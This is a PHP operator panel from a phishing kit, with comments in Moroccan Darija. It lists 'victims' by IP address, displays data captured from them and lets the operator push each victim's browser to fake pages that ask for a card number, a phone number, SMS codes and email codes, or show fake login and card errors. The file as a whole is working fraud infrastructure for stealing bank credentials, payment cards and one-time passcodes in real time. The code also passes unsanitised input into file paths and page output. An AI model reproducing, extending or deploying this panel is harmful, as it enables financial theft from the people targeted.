<?php
// 1. Control Logic - Update Victim Action
if (isset($_GET['ip']) && isset($_GET['cmd'])) {
    $ip = $_GET['ip']; 
    $cmd = $_GET['cmd'];
    $status_file = "../core/status_$ip.json"; 
    
    if (file_exists($status_file)) {
        $data = json_decode(file_get_contents($status_file), true);
        $data['action'] = $cmd;
        file_put_contents($status_file, json_encode($data));
    }
    // Fach kiy-cliqui 3la command, kiy-bqa f nfs l-page dyal dak l-victim
    header("Location: panel.php?target=$ip"); 
    exit();
}

// 2. Clear Specific Victim (Optional)
if (isset($_GET['clear_single'])) {
    $ip = $_GET['clear_single'];
    @unlink("../core/status_$ip.json");
    header("Location: panel.php"); 
    exit();
}

// 3. Get Target Victim
$target_ip = isset($_GET['target']) ? $_GET['target'] : '';

// Ila makaynach target_ip, ghadi i-chouf ga3 l-victims (Standard)
// Ila kayna, ghadi i-focuser ghir 3liha
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CONTROL PANEL - <?php echo $target_ip ? $target_ip : 'ALL'; ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
    <style>
        body { background-color: #020617; color: #cbd5e1; font-family: sans-serif; }
        .log-area::-webkit-scrollbar { width: 4px; }
        .log-area::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 10px; }
    </style>
</head>
<body class="p-4 md:p-8">

    <div class="max-w-4xl mx-auto">
        <header class="flex justify-between items-center p-5 bg-[#1e293b] rounded-t-xl border border-slate-800 shadow-2xl">
            <h1 class="text-xl font-black text-[#A1C441] italic uppercase">
                <i class="fa-solid fa-bolt mr-2"></i> <?php echo $target_ip ? "VICTIM: $target_ip" : "ALL VICTIMS"; ?>
            </h1>
            <?php if($target_ip): ?>
                <a href="panel.php" class="text-[10px] bg-slate-700 px-3 py-1 rounded hover:bg-slate-600">SHOW ALL</a>
            <?php endif; ?>
        </header>

        <div class="bg-slate-900 border-x border-b border-slate-800 rounded-b-xl p-6 shadow-2xl">
            
            <?php
            // Logic dyal l-filtering
            if ($target_ip) {
                $files = ["../core/status_$target_ip.json"];
            } else {
                $files = glob("../core/status_*.json");
                if($files) usort($files, function($a, $b) { return filemtime($b) - filemtime($a); });
            }

            if (!$files || !file_exists($files[0])) {
                echo "<div class='text-center py-10 text-slate-500 font-bold uppercase tracking-widest text-xs'>No Victims Online</div>";
            } else {
                foreach ($files as $file) {
                    if(!file_exists($file)) continue;
                    $ip = str_replace(['../core/status_', '.json'], '', $file);
                    $data = json_decode(file_get_contents($file), true);
                    $online = (time() - ($data['last_seen'] ?? 0)) < 15;
            ?>
            
            <div class="mb-10 bg-slate-950/50 p-4 rounded-lg border border-slate-800">
                <div class="flex justify-between items-center mb-4 border-b border-slate-800 pb-3">
                    <div>
                        <span class="text-white font-mono font-bold text-lg"><?php echo $ip; ?></span>
                        <span class="ml-2 text-[10px] <?php echo $online ? 'text-green-500' : 'text-red-500'; ?> uppercase">
                            <?php echo $online ? '● Online' : '○ Offline'; ?>
                        </span>
                    </div>
                    <div class="text-[10px] font-black px-2 py-1 rounded bg-black text-yellow-500 border border-yellow-500/20 uppercase">
                        CURRENT: <?php echo $data['action'] ?? 'waiting'; ?>
                    </div>
                </div>

                <div class="log-area bg-black/40 rounded p-4 h-48 overflow-y-auto font-mono text-[12px] border border-slate-800 mb-6 shadow-inner">
                    <?php 
                    if (isset($data['results'])) {
                        foreach (array_reverse($data['results']) as $r) {
                            echo "<div class='mb-3 border-b border-slate-800/30 pb-2'>";
                            foreach ($r as $k => $v) {
                                if($k == 'time') echo "<span class='text-slate-500'>[$v]</span><br>";
                                else echo "<b class='text-blue-400'>".strtoupper($k).":</b> <span class='text-white'>$v</span><br>";
                            }
                            echo "</div>";
                        }
                    }
                    ?>
                </div>

                <div class="grid grid-cols-2 md:grid-cols-4 gap-2">
                    

						
						
                        <a href="?ip=<?php echo $ip; ?>&cmd=index.php" class="bg-green-600/10 text-green-400 border border-green-600/20 py-2 rounded text-[9px] font-black hover:bg-green-600 hover:text-white text-center"> LOGIN ERROR</a>
						
						
                         <a href="?ip=<?php echo $ip; ?>&cmd=app.php" class="bg-blue-600/10 text-blue-400 border border-blue-600/20 py-2 rounded text-[9px] font-black hover:bg-blue-600 hover:text-white text-center">APPROVE </a>
						 
						 

                        <a href="?ip=<?php echo $ip; ?>&cmd=phone.php" class="bg-orange-600/10 text-orange-400 border border-orange-600/20 py-2 rounded text-[9px] font-black hover:bg-orange-600 hover:text-white text-center">NUMERO TELEPHONE</a>


                        <a href="?ip=<?php echo $ip; ?>&cmd=cc.php" class="bg-green-600/10 text-green-400 border border-green-600/20 py-2 rounded text-[9px] font-black hover:bg-green-600 hover:text-white text-center"> CARTE </a>
                        <a href="?ip=<?php echo $ip; ?>&cmd=cc-error.php" class="bg-green-600/10 text-green-400 border border-green-600/20 py-2 rounded text-[9px] font-black hover:bg-green-600 hover:text-white text-center"> CARTE ERROR</a>
						
						
                        <a href="?ip=<?php echo $ip; ?>&cmd=sms.php" class="bg-pink-600/10 text-pink-400 border border-pink-600/20 py-2 rounded text-[9px] font-black hover:bg-pink-600 hover:text-white text-center">SMS</a>
                        <a href="?ip=<?php echo $ip; ?>&cmd=sms-error.php" class="bg-pink-600/10 text-pink-400 border border-pink-600/20 py-2 rounded text-[9px] font-black hover:bg-pink-600 hover:text-white text-center">SMS ERROR</a>
						
						
						<a href="?ip=<?php echo $ip; ?>&cmd=email.php" class="bg-green-600/10 text-green-400 border border-green-600/20 py-2 rounded text-[9px] font-black hover:bg-green-600 hover:text-white text-center"> CODE EMAIL </a>
                        <a href="?ip=<?php echo $ip; ?>&cmd=email-error.php" class="bg-green-600/10 text-green-400 border border-green-600/20 py-2 rounded text-[9px] font-black hover:bg-green-600 hover:text-white text-center"> CODE EMAIL ERROR</a>
						

                        <a href="?ip=<?php echo $ip; ?>&cmd=success.php" class="bg-white-600/10 text-white-500 border border-white-600/20 py-2 rounded text-[9px] font-black hover:bg-white-600 hover:text-white text-center col-span-2 tracking-widest uppercase">SUCCESS</a>
                    </div>
                </div>
            </div>
            <?php 
                } 
            }
            ?>
        </div>
    </div>

    <script>
        // Auto refresh ghir ila kant target_ip (single victim view)
        setInterval(() => {
            if (document.activeElement.tagName !== "INPUT") {
                location.reload();
            }
        }, 5000);
    </script>
</body>
</html>